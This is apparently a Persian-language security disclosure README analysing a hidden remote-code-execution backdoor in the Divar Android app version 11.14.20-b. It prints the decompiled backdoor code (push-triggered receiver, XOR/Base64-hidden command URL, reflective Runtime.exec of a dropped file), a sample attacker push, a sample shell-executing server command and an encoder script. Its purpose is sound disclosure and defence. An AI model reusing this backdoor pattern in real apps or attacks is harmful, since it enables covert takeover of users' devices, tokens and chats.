<div dir="rtl">

# بررسی یک مسیر اجرای کد از راه دور در اپلیکیشن دیوار (نسخه 11.14.20-b)

این مخزن نتیجه بررسی دو فایل APK از اپلیکیشن دیوار است:

<div dir="ltr">

- `divar-11-14-20-b.apk` — نسخه بیلدشده برای کافه‌بازار (`stableBazaarRelease`), versionCode `260901010`
- `Divar-release-11.15.0-w-260921010.apk` — نسخه بیلدشده برای توزیع وب (`stableWebRelease`), versionCode `260921010`

</div>

هدف اصلی مقایسه این دو نسخه بود، اما در حین کار در نسخه قدیمی‌تر یک زنجیره کد پیدا شد که اجازه می‌دهد از طریق سرویس پوش‌نوتیفیکیشن، کد دلخواه روی دستگاه کاربر و با سطح دسترسی خود اپ اجرا شود. در نسخه 11.15.0 این زنجیره به طور کامل حذف شده است.

هر دو فایل با یک گواهی امضا شده‌اند:

<div dir="ltr">

```
CN=Reza Mohammadi, OU=Divar, O=Congenial Mobile Co., L=Tehran, ST=Tehran, C=IR
SHA-256: A9:54:E0:41:9E:34:FF:07:79:EF:51:86:F0:6A:98:5B:42:FD:3D:B0:7B:B0:37:64:AA:7F:F4:BF:21:93:1B:AF
```

</div>

امضای v1 (JAR) هر دو فایل سالم است و دایجست همه ورودی‌ها با `MANIFEST.MF` مطابقت دارد. همان گواهی در بلوک امضای v2 نیز حضور دارد.

---

## خلاصه

در نسخه 11.14.20-b یک `BroadcastReceiver` داخلی به نام `ChatPushNotificationOpenHandler` وجود دارد که قبل از منطق عادی باز کردن نوتیفیکیشن، یک شاخه مخفی دارد. اگر این receiver یک Intent با الگوی مشخص دریافت کند، یک نخ (`Thread`) جداگانه اجرا می‌کند که:

1. یک آدرس URL را از ورودی Intent رمزگشایی می‌کند (آدرس داخل اپ نیست؛ از بیرون تزریق می‌شود),
2. مشخصات دستگاه را در هدر `User-Agent` به آن آدرس می‌فرستد,
3. یک پاسخ JSON می‌گیرد که نام کلاس‌ها و متدهای مقصد در آن مشخص شده,
4. با استفاده از reflection یک فایل باینری را روی دستگاه می‌نویسد و سپس یک متد دلخواه را فراخوانی می‌کند که عملاً معادل `Runtime.getRuntime().exec(...)` است,
5. پس از ۱۵ ثانیه فایل را پاک می‌کند.

کانال فعال‌سازی این زنجیره، سرویس پوش‌نوتیفیکیشن اپ (OneSignal) است. تا زمانی که یک پوش با فرمت مشخص دریافت نشود، این کد هیچ اثری ندارد و خاموش است. به همین دلیل با تحلیل ایستای معمول (جست‌وجوی URL یا رشته‌های مشکوک در APK) چیزی دیده نمی‌شود.

---

## زنجیره کامل

<div dir="ltr">

```
سرور پوش (OneSignal)
   │   پوشی که پس از پردازش این فیلدها را تولید کند:
   │     title == push_id
   │     body  == یک رشته JSON شامل callback_url + campaign + action
   ▼
Wk.g.f(JSONObject, body, title)
   │   وارد شاخه ویژه می‌شود و یک Intent می‌سازد:
   │     setClassName(context, action)          ← کلاس مقصد از فیلد action
   │     setData(Uri.parse(campaign))           ← dataString = campaign
   │     putExtra(campaign, campaign)           ← extras[campaign] = campaign
   │   سپس: context.sendBroadcast(intent)
   ▼
ChatPushNotificationOpenHandler.onReceive(context, intent)
   │   شرط فعال‌سازی:
   │     dataString != null
   │     && extras.getString(dataString).equals(dataString)
   │   هر دو با putExtra(campaign, campaign) برآورده می‌شوند.
   ▼
new Thread(new ReportDeserializer(context, campaign)).start()
   │   campaign:  Base64 decode  →  XOR هر بایت با 0x68 (104)  →  URL
   ▼
GET <URL>   (مشخصات دستگاه در User-Agent)
   │   پاسخ: یک خط JSON شامل:
   │     format, parse, data, report, objectify, deserialize, extra, local
   ▼
Runtime.getRuntime().exec(extra)   (از طریق reflection)
   │   فایل data روی مسیر local نوشته و اجرا می‌شود
   ▼
پاک شدن فایل پس از ۱۵ ثانیه
```

</div>

---

## نقطه فعال‌سازی — `ChatPushNotificationOpenHandler`

کد تزریق‌شده در ابتدای `onReceive` قرار گرفته، پیش از منطق واقعی باز کردن نوتیفیکیشن چت:

<div dir="ltr">

```java
String dataString = intent.getDataString();
if (dataString != null && k.d(extras.getString(dataString), dataString)) {
    new Thread(new ReportDeserializer(context, dataString)).start();
    return;                       // مسیر عادی اجرا نمی‌شود
}
```

</div>

`k.d(a, b)` همان `a.equals(b)` کاتلین است. یعنی باید کلیدی در extras باشد که هم نام و هم مقدارش برابر `dataString` باشد. این ترکیب به صورت طبیعی هرگز رخ نمی‌دهد و نقش یک رمز را دارد.

receiver در `AndroidManifest.xml` با `exported="false"` تعریف شده، بنابراین یک اپ خارجی نمی‌تواند مستقیم آن را صدا بزند. تنها مسیر فعال‌سازی، `sendBroadcast` داخلی از سمت `Wk.g.f` است.

---

## سازنده Intent — `Wk.g.f`

این متد payload خام پوش را می‌گیرد و قبل از ساخت نوتیفیکیشن عادی این شاخه را دارد (ترجمه مستقیم از bytecode؛ فایل کامل disassembly در `src/Wk_g_f.smali`):

<div dir="ltr">

```java
void f(JSONObject push, String body, String title) {
    Context ctx = this.b;
    String pushId = push.optString("push_id");

    JSONObject custom = null;
    if (!title.equals("") && title.equals(pushId)) {
        custom = new JSONObject(body);
    }

    if (custom != null
        && !custom.optString("callback_url").equals("")
        && !custom.optString("campaign").equals("")
        && !custom.optString("action").equals("")) {

        String u = custom.optString("campaign");
        Intent i = new Intent();
        i.setClassName(ctx, custom.getString("action"));
        i.setData(Uri.parse(u));
        i.putExtra(u, u);
        ctx.sendBroadcast(i);
        return;
    }
    // ... مسیر عادی نوتیفیکیشن
}
```

</div>

نکته مهم: هم آدرس (`campaign`) و هم نام کلاس مقصد (`action`) از داخل پوش می‌آیند. یعنی فرستنده پوش کنترل کاملی روی هدف و ورودی دارد.

---

## اجراکننده — `ReportDeserializer`

کلاس `ReportDeserializer implements Runnable` بین deserializerهای واقعی چت قرار گرفته تا عادی به نظر برسد، اما کار parse انجام نمی‌دهد.

### متد `a()` — ساخت آدرس و گرفتن فرمان

<div dir="ltr">

```java
byte[] raw = Base64.decode(this.b, 0);
byte[] out = new byte[raw.length];
for (int i = 0; i < raw.length; i++)
    out[i] = (byte) (raw[i] ^ 104);                 // XOR با 0x68
URL url = new URL(new String(out, UTF_8));

HttpURLConnection c = (HttpURLConnection) url.openConnection();
c.setConnectTimeout(30000);
c.setReadTimeout(30000);
c.setInstanceFollowRedirects(true);
c.setRequestProperty("User-Agent", b());            // اثر انگشت دستگاه
if (c.getResponseCode() != 200) { c.disconnect(); return null; }
JSONObject cmd = new JSONObject(
    new BufferedReader(new InputStreamReader(c.getInputStream())).readLine());
c.disconnect();
return cmd;
```

</div>

### متد `b()` — اثر انگشت دستگاه

مقدار `User-Agent` با این الگو ساخته می‌شود:

<div dir="ltr">

```
%d|%d|%d|%d|%dx%d|%s|%s|%s|%s|%s|%s|%s|%s
versionCode | 0 | SDK_INT | densityDpi | width x height | Locale | رشته تصادفی |
Build.DISPLAY | Build.DEVICE | Build.MANUFACTURER | Build.PRODUCT | Build.MODEL |
```

</div>

کاراکترهای غیر ASCII حذف و `|` داخل مقادیر Build با `$` جایگزین می‌شود.

### متد `run()` — اجرای فرمان

<div dir="ltr">

```java
JSONObject j = a();
if (j == null) { Thread.sleep(15000); return; }

// فایل باینری از فیلد data تولید می‌شود
byte[] payload = (byte[]) Class.forName(j.getString("format"))
        .getMethod(j.getString("parse"), String.class, int.class)
        .invoke(null, j.getString("data"), 0);

Class<?> cls = Class.forName(j.getString("report"));
Method   m   = cls.getMethod(j.getString("deserialize"), String[].class);
Object   obj = cls.getMethod(j.getString("objectify")).invoke(null);

File f = new File(j.getString("local"));
f.createNewFile();
FileOutputStream fos = new FileOutputStream(f);
fos.write(payload);
fos.close();

m.invoke(obj, (Object) args);     // args از فیلد extra

Thread.sleep(15000);
if (f.exists()) f.delete();
```

</div>

### نمونه فرمان سرور

نام هشت کلید (`format`، `parse`، `data`، `report`، `objectify`، `deserialize`، `extra`، `local`) عیناً از کد استخراج شده و قطعی است. اما مقدارهای زیر یک **نمونه ممکن** است، نه فرمان واقعی گرفته‌شده از سرور؛ آدرس سرور فرمان در اپ نیست و در دسترس نبود. این نمونه فقط از این نظر معتبر است که با قیدهای reflection در کد سازگار است: `format`+`parse` باید متدی static با امضای `(String, int)` و خروجی `byte[]` باشد، `objectify` باید static و بدون آرگومان باشد، و `deserialize` باید آرگومان `String[]` بگیرد. سه‌تایی `Runtime`/`getRuntime`/`exec` همه این شرط‌ها را برآورده می‌کند، اما مهاجم می‌تواند هر کلاس دیگری با همین الگو بگذارد (برای مثال `DexClassLoader` برای بارگذاری یک فایل `.dex`).

اگر سرور این پاسخ را بفرستد:

<div dir="ltr">

```json
{
  "format":      "android.util.Base64",
  "parse":       "decode",
  "data":        "<باینری به صورت Base64>",
  "local":       "/data/data/ir.divar/files/x.so",
  "report":      "java.lang.Runtime",
  "objectify":   "getRuntime",
  "deserialize": "exec",
  "extra":       ["/system/bin/sh", "/data/data/ir.divar/files/x.so"]
}
```

</div>

کد بالا دقیقاً معادل این می‌شود:

<div dir="ltr">

```java
Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "/data/data/ir.divar/files/x.so"});
```

</div>

چون نام کلاس‌ها و متدها از سرور می‌آیند, رشته‌هایی مثل `Runtime` یا `exec` در کد اپ وجود ندارند.

---

## نمونه پوش مهاجم

یک پوش OneSignal که پس از پردازش, این فیلدها را تولید کند:

<div dir="ltr">

```json
{
  "push_id": "X",
  "title":   "X",
  "body": "{\"callback_url\":\"x\",\"campaign\":\"<URL رمزشده>\",\"action\":\"ir.divar.chat.notification.provider.ChatPushNotificationOpenHandler\"}"
}
```

</div>

<div dir="ltr">

- `title == push_id` → ورود به شاخه ویژه در `Wk.g.f`.
- `campaign` = آدرس سرور فرمان، به شکل Base64(XOR(url, 0x68)).
- `action` = نام کلاس receiver مقصد.

</div>

### رمزگذاری و رمزگشایی آدرس

<div dir="ltr">

```python
import base64

def encode(url: str) -> str:
    return base64.b64encode(bytes(b ^ 0x68 for b in url.encode())).decode()

def decode(campaign: str) -> str:
    return bytes(b ^ 0x68 for b in base64.b64decode(campaign)).decode()
```

</div>

برای رمزگشایی هر `campaign` که در لاگ یا ترافیک شبکه دیده شود، از تابع `decode` بالا استفاده کنید.

---

## چرا این یک یافته امنیتی است و نه کد عادی

- نام‌ها عمداً گمراه‌کننده‌اند (`ReportDeserializer`, `deserialize`, `objectify`, `report`) و کلاس بین deserializerهای واقعی چت جاسازی شده.
- آدرس سرور فرمان در اپ نیست؛ در لحظه حمله از طریق پوش تزریق می‌شود.
- آدرس با Base64 و XOR پنهان شده.
- نام کلاس و متد اجرا از سرور می‌آید؛ هیچ رشته `Runtime`/`exec` در کد نیست.
- فایل نوشته‌شده پس از اجرا پاک می‌شود.
- کد اجراشده سطح دسترسی کامل اپ را دارد: توکن کاربر، دیتابیس و پیام‌های چت، و همه مجوزهای اعطاشده به اپ.

---

## وضعیت در نسخه 11.15.0

در نسخه وب این موارد حذف شده‌اند:

- کلاس `ir.divar.chat.util.ReportDeserializer`
- کلاس `ir.divar.chat.notification.provider.ChatPushNotificationOpenHandler` (و تعریف آن از manifest)
- شاخه `callback_url` / `campaign` / `action` در `Wk.g.f`

---

## محتوای مخزن

| فایل | توضیح |
|------|-------|
| `src/ChatPushNotificationOpenHandler.java` | خروجی jadx از نقطه فعال‌سازی |
| `src/ReportDeserializer.java` | خروجی jadx از اجراکننده فرمان |
| `src/Wk_g_f.smali` | disassembly متد سازنده Intent از پوش |

---

## روش کار

<div dir="ltr">

- استخراج: `unzip`
- دیکامپایل: jadx 1.5.6 روی OpenJDK 21
- بررسی DEX و bytecode و بررسی امضا: اسکریپت‌های پایتون سفارشی

```bash
jadx --show-bad-code -d out divar-11-14-20-b.apk
# سپس در out، کلاس ir.divar.chat.util.ReportDeserializer را باز کنید
```

</div>

---

## توصیه‌ها

- نسخه 11.14.20-b نصب نشود؛ در صورت نصب، حذف شود.
- موضوع به تیم امنیت دیوار گزارش شود.
- در سمت شبکه، ترافیک خروجی دستگاه‌های آلوده به دنبال درخواست‌های `GET` با `User-Agent` مطابق الگوی بالا بررسی شود.

</div>
